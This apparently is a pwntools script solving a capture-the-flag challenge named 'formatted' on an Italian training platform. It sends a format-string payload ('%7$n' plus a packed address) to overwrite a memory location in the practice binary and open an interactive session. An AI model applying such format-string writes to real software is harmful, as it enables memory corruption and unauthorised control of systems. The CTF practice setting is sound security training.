from pwn import *

elf = context.binary = ELF('./formatted')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("formatted.challs.olicyber.it", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()
conn.sendline(b'aaaa%7$n'+ p64(0x40404C))
conn.interactive()